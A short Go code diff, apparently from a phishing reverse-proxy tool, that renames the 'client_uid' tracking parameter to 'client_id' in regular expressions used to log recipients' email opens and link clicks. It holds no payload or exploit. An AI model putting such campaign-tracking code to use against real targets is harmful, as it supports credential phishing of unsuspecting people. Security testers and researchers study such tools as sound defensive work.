@@ -171,8 +171,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
             // Handle clicked link and email opened events
             rid := ""
             browser := map[string]string{}
-            ridr, _ := regexp.Compile(`client_uid=([^\"]*)`)
-            trackr, _ := regexp.Compile(`track\?client_uid=`)
+            ridr, _ := regexp.Compile(`client_id=([^\"]*)`)
+            trackr, _ := regexp.Compile(`track\?client_id=`)
             rid_match := ridr.FindString(req_url)
             opened_match := trackr.FindString(req_url)
             //log.Debug("Track regex", trackr.FindString(req_url))
